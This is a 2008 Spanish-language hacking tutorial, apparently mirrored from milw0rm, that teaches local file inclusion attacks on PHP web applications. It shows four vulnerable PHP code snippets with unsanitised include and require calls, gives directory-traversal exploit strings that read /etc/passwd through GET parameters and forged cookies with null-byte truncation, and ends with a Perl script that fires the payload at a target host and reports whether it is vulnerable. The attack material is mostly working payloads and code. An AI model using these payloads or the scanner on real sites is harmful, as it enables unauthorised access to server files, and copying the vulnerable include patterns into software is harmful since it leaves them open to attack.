ï»¿=-|=========================================-{ www.spanish-hackers.com }-====|
=-| fucking the Web Apps [LFI #1 - attack edition]-==========================|
=-|==========================================================================|
=-[ By JosS <spanish-hackers.com> ]-=========================-[ 07/10/2008]-=|   



 ____                  __                              __    __                
/\  _`\               /\ \      __                    /\ \__/\ \               
\ \ \L\_\__  __    ___\ \ \/'\ /\_\    ___      __    \ \ ,_\ \ \___      __   
 \ \  _\/\ \/\ \  /'___\ \ , < \/\ \ /' _ `\  /'_ `\   \ \ \/\ \  _ `\  /'__`\ 
  \ \ \/\ \ \_\ \/\ \__/\ \ \\`\\ \ \/\ \/\ \/\ \L\ \   \ \ \_\ \ \ \ \/\  __/ 
   \ \_\ \ \____/\ \____\\ \_\ \_\ \_\ \_\ \_\ \____ \   \ \__\\ \_\ \_\ \____\
    \/_/  \/___/  \/____/ \/_/\/_/\/_/\/_/\/_/\/___L\ \   \/__/ \/_/\/_/\/____/
                                                /\____/                        
                                                \_/__/                         
 __      __          __          ______                            
/\ \  __/\ \        /\ \        /\  _  \                           
\ \ \/\ \ \ \     __\ \ \____   \ \ \L\ \  _____   _____     ____  
 \ \ \ \ \ \ \  /'__`\ \ '__`\   \ \  __ \/\ '__`\/\ '__`\  /',__\ 
  \ \ \_/ \_\ \/\  __/\ \ \L\ \   \ \ \/\ \ \ \L\ \ \ \L\ \/\__, `\
   \ `\___x___/\ \____\\ \_,__/    \ \_\ \_\ \ ,__/\ \ ,__/\/\____/
    '\/__//__/  \/____/ \/___/      \/_/\/_/\ \ \/  \ \ \/  \/___/ 
                                             \ \_\   \ \_\         
                                              \/_/    \/_/         
                                                         
                                                        Local File Inclusion #1
                                                                 attack edition

-[ INFOS ]-----------------------------------------------------------------------
Title: "fucking the Web Apps [LFI #1]"
Version: attack edition
Author: JosS

mail: sys-project[at]hotmail[dot]com
site: http://spanish-hackers.com
team: Spanish Hackers Team - [SHT]
date: 2008-10-07

-[ SUMMARY ]---------------------------------------------------------------------
	0x00: IntroducciÃ³n
	0x01: Local File Inclusion
	0x02: Exploits
	0x03: CrÃ©ditos


                               ___ for the sake ___


------[ 0x00.- IntroducciÃ³n ]

Hola a todos los que estÃ¡n hoy aquÃ­ leyendo este 'paper' ya bien sea para repasar
conocimientos ya adquiridos o bien para profundizar y extender sus conocimientos.

Antes de empezar con la breve introducciÃ³n sobre que leerÃ¡s en este documento,
quisiera presentarme. Me hago llamar JosS y soy el fundador de Spanish Hackers Team,
una de mis pasiones dentro del Ã¡mbito informÃ¡tico es la de investigaciÃ³n de
vulnerabilidades (Bug Research) especialmente en aplicaciones webs (Web Apps) que
serÃ¡ el tema que tocaremos en este 'paper'. Les dejo mi perfil de milw0m por si 
quieren saber mÃ¡s de mÃ­.

id: 1248
profile: http://milw0rm.com/author/1248

Este texto no es para nada lo que os esperÃ¡is al leer el sumario, no vamos
a ver las tÃ©cnicas en sÃ­, lo que haremos es dejarnos de explicaciones bÃ¡sicas y 
pasaremos a profundizar conocimientos. Veremos ejemplos reales no muy comunes,
por si nos pasase en una situaciÃ³n real no nos quedemos con la duda de, Â¿ QuÃ©
hago ahora?. A si que podrÃ­a decir no muy atrevido que este 'paper' te abre
la mente y tus aspiraciones a explotar vulnerabilidades de distintas formas, 
bÃ¡sicamente 'Thought hacker'.

Eso es lo que os espera en este aburrido y divertido 'paper'.


------[ 0x01.- Local File Inclusion ]

Vamos a ver distintas maneras de como pueden estar provocados los 'LFI' y por
tanto a distinta programaciÃ³n, distinta explotaciÃ³n, esto es lo que buscamos:
una mente abierta. ;)

[code #1]

x:  >...
 if (isset($_GET["mode"]))

	 {

	  	if ($_GET["mode"]=="edit")

		{

		 if (isset($_GET['id']))

		 {

		  	$notefile = $_GET['id'];

			if ($notefile == "new")

			{

			 $title = "";

			 $notes = "";

			}

			else

			{

			 $temp = "notes/" . $notefile;

			 require($temp);

			}
x:  <...
x: }}}

[ENDcode #1]

Este es el ejemplo mÃ¡s simple de 'LFI' que veremos. Como vemos no tiene mucha 
dificultad para entender su comportamiento.

1) Comprueba si existe la variable 'mode' pasada por 'GET'. Si el resultado es
   1, es decir verdadero entonces entraremos dentro de la sentencia 'IF'.
2) Comprueba si existe la variable 'edit' pasada por 'GET'. Si el resultado es
   1, es decir verdadero entonces entraremos dentro de la sentencia 'IF'.

Continuamos avanzando ...

3) Comprueba si existe la variable 'id' pasada por 'GET'. Si el resultado es
   1, es decir verdadero entonces entraremos dentro de la sentencia 'IF'.
4) Pasa a la variable '$notefile' el valor que asignamos a 'id' por medio de 
   'GET' y comprueba si la variable '$notefile' es igual a 'new', en este caso 
   nos interesa que no entre en esa sentencia de 'IF', porque no estÃ¡ el include 
   que buscamos, a si que haremos que en esa condiciÃ³n obtengamos el valor 0 
   y pasemos al else.
5) Asigna a '$temp' una cadena con nuestro valor dentro de ella ($notefile).
6) Por Ãºltimo hace uso de la funciÃ³n 'require' e incluye la cadena '$temp' con
   nuestro valor dentro de ella.

Exploit: ?mode=edit&id=../../../../../../../../../../etc/passwd

En caso de tener:
$temp = "notes/" . $notefile . ".php";

El exploit tendrÃ­a que tener un 'NULL BYTE' (%00h) al final de la cadena.

Exploit: ?mode=edit&id=../../../../../../../../../../etc/passwd%00

Esto fue todo para nuestro primer ejemplo normalito, de moento todo muy 
bÃ¡sico, fÃ¡cil y nada que no se haya visto. Â¿ContinuÃ¡mos?

----

DespuÃ©s de a ver calentado vamos a por el segundo ejemplo. El cÃ³digo
es vulnerable a 'LFI' mediante la vulnerabilidad de 'Insecure Cookie
Handling'. Me imagino que os preguntarÃ©is: Â¿Una vulnerabilidad dentro
de otra? Raro no? ... pues no!. Miremos el ejemplo.

[code #2]

if(!empty($_COOKIE['language']) && !isset($_SESSION['language'])){
	$_SESSION['language'] = $_COOKIE['language'];
}

....

if(LANG == ""){
	if(!isset($_SESSION['language'])){
		include("lang/english/lang.php");
		$_LANG = "english";
	} else {
		include("lang/".$_SESSION['language']."/lang.php");
		$_LANG = $_SESSION['language'];
	}

... }

[ENDcode #2]

1) Comprueba si las dos variables "$_COOKIE['language'] y "$_SESSION['language']"
   no estÃ¡n definidas, en el cÃ³digo vemos claramente que no estÃ¡n definidas, por 
   lo que entramos de lleno en el 'IF'.
2) Debemos saber que la variable '$_COOKIE' puede ser manipulada por el usuario,
   por lo que esa variable serÃ¡ nuestro vector de ataque. Como vemos en el cÃ³digo
   se le asigna a "$_SESSION['language']" el valor de "$_COOKIE['language']" que 
   serÃ¡ introducido por nosotros mediante la vulnerabilidad de 'Insecure Cookie
   Handling'.
3) Comprueba que 'LANG' no tiene valor, en este caso es afirmativo y entramos al
   'IF'.
4) Si no estÃ¡ definida "$_SESSION['language']" entrarÃ­amos al 'IF' pero como el
   cÃ³digo pasÃ³ el valor de $_COOKIE a $_SESSION, la variable si estÃ¡ definida y
   nos saltarÃ­a al 'else'.
5) Dentro del 'else' hace uso de la funciÃ³n 'include' para incluir nuestra cadena.

Exploit: 
javascript:document.cookie="language=../../../../../../../../../../etc/passwd%00; path=/";

Como vemos, tuvimos que aÃ±adir el NULL BYTE (%00h) porquÃ© en el include tenÃ­amos una
cadena que se sumarÃ­a a la nuestra y evitarÃ­a nuestro 'Directory Traversal'.

Â¿TenÃ©is ganas de continuar? ... yo las tendrÃ­a.

----

En este tercer y penÃºltimo ejemplo del apartado de 'LFI' tenemos una situaciÃ³n 
muy parecida a la del ejemplo 2, solo que esta vez tenemos un intruso, la
funciÃ³n 'explode' de PHP. Abramos la mente y pensemos como un Hacker.

[code #3]

x:  >...
 if (isset($HTTP_COOKIE_VARS["userInfo"]) && $HTTP_COOKIE_VARS["userInfo"] != "") {
	$userArray = explode(" ", $HTTP_COOKIE_VARS["userInfo"]);
	$userName = $userArray[0];
	$userID = $userArray[1];
	$userLang = $userArray[2];
	include("include/lang/$userLang/inc.messages.php");
	}
x:  <...

[ENDcode #3]

DebÃ©is saber que "$HTTP_COOKIE_VARS" tambiÃ©n puede ser manipulado por el usuario, no
os encerrÃ©is con "$_COOKIE", abriros ...

1) El Ãºnico 'IF' del cÃ³digo comprueba que la variable sea distinto a 'nothing', es 
   decir que cuando nosotros ejecutemos nuestro 'exploit' daremos valor a 
   "$HTTP_COOKIE_VARS["userInfo"]" y por tanto entramos de lleno en el 'IF'.
2) La funciÃ³n 'explode', el intruso que nos quiere fastidiar el 'bug' separa las
   distintas cadenas y las guarda en un 'array'.
3) Fijaros en la linea del 'include', incluye '$userLang' que recoje el tercer valor
   de la cadena que se encuentra en "$HTTP_COOKIE_VARS["userInfo"]".

Proof of Concept (function 'explode' PHP):

1)
String = JosS;
[0] = JosS;
[1] = ;
[2] = ; ---> INCLUDE

2) 
String = JosS JosS JosS;
[0] = JosS;
[1] = JosS;
[2] = JosS; ---> INCLUDE

Â¿EntendÃ©is?, es decir que deberÃ­amos introducir algo como: basura basura loquenosinteresa

Exploit: 
javascript:document.cookie="userInfo=JosS JosS ../../../../etc/passwd%00; path=/";


----

Para el cuarto y Ãºltimo ejemplo para terminar el apartado de 'LFI' tenemos una 
situaciÃ³n parecida a la del ejemplo 1, es decir un LFI, que tenemos que jugar
con los 'IF GETS' mÃ¡s la vulnerabilidad que permite el manejo de la 'COOKIE'.

[code #4]

x:  >...
 if (isset($_GET["mode"]))
	 {
	  	if ($_GET["mode"]=="edit")
		{
		 if (isset($_GET['id']))
		 {
		  	$notefile = $_COOKIE['note'];
			if ($notefile == "new")
			{
			 $title = "";
			 $notes = "";
			}
			else
			{
			 $temp = "notes/" . $notefile;
			 require($temp);
			}
x:  <...
x: }}}

[ENDcode #4]

No voy a explicar nuevamente paso a paso lo que hace este cÃ³digo, ya que lo vimos
en el ejemplo 1 de este apartado.

Tenemos que tener en cuenta que para que nuestro de valor de '$_COOKIE' se incluya
debemos dar positivo a los 'IF' que nos ayudan a llegar al include de nuestra
'COOKIE'. Entonces nos quedamos con estos dos exploits.

Exploit 1:
javascript:document.cookie="note=../../../../../../../../../../etc/passwd; path=/";

Exploit 2: ?mode=edit&id


------[ 0x02.- Exploits ]

Yo mÃ¡s bien los llamarÃ­a "automatizadores" ya que no hacen nada mÃ¡s que simplificar
el proceso y comodidad del usuario. El ejemplo estÃ¡ programado en Perl, ya que
junto a python es lo que mÃ¡s se usa en estos casos. Veamos el cÃ³digo que os tengo
preparado.

[code #1]

use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

if (!$ARGV[0])
{
print "Usage: perl xpl.pl [HOST]\n";
print "Example: perl xpl.pl http://localhost/path/\n";
}

else
{

$web=$ARGV[0];
chomp $web;

$iny="vuln.php?vuln=../../../../../../../../../../../../../../../../etc/passwd%00";

my $web1=$web.$iny;
print "$web1\n\n";
my $ua = LWP::UserAgent->new;
my $req=HTTP::Request->new(GET=>$web1);
$doc = $ua->request($req)->as_string;

if ($doc=~ /^root/moxis ){
print "Web is vuln\n";
}
else
{
print "Web is not vuln\n";
}}

[ENDcode #1]

El exploit es simple y no tiene mucho misterio. Hacemos uso del mÃ³dulo 'LWP' para hacer
nuestra conexiÃ³n a la web (con la inyecciÃ³n de explotaciÃ³n incluida) y mediante una
expresiÃ³n regular buscamos que se haya incluido el archivo y si es asÃ­ lo muestra, en caso
contrario sale un mensaje de error.


------[ 0x03.- CÅ•editos ]

Author: JosS
mail: sys-project[at]hotmail[dot]com
site: http://spanish-hackers.com
team: Spanish Hackers Team - [SHT]

work fun! 

__EOF__

# milw0rm.com [2008-10-07]
            